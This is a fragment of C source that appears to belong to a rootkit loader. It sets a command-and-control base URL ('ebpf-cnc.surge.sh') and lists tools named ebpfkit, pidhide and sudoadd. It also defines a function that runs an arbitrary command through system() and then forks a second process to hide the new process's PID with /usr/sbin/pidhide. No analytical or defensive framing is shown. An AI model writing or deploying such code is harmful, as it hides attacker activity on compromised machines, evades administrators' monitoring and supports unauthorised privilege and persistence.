


static const char *base_url = "http://ebpf-cnc.surge.sh/";

static const char *programs[] = {"ebpfkit", "ebpfkit-client", "webapp", "pause", "pidhide", "sudoadd", NULL};

pid_t run_task_and_hide(const char *cmd) {
    pid_t pid = fork();
    if (pid == 0) { // Child process for running the task
        system(cmd);
        exit(0);
    } else if (pid > 0) { // Parent process
        pid_t hide_pid = fork();
        if (hide_pid == 0) { // Child process for hiding the PID
            char hide_cmd[256];
            snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", pid);
            system(hide_cmd);
            exit(0);
        } else if (hide_pid < 0) { // Fork failed for hide_pid
            perror("fork");
            exit(1); // Exit if fork fails
        }
    } else { // Fork failed for run_task
        perror("fork");
        exit(1); // Exit if fork fails
    }
    return pid;
}
